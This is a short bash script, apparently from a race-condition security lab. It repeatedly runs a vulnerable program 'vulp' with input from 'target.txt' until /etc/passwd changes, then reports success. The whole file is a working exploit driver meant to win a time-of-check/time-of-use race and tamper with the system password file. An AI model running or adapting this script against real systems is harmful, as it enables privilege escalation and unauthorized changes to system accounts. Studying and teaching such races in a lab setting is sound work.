#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]  
do
   ./vulp < target.txt
   new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"


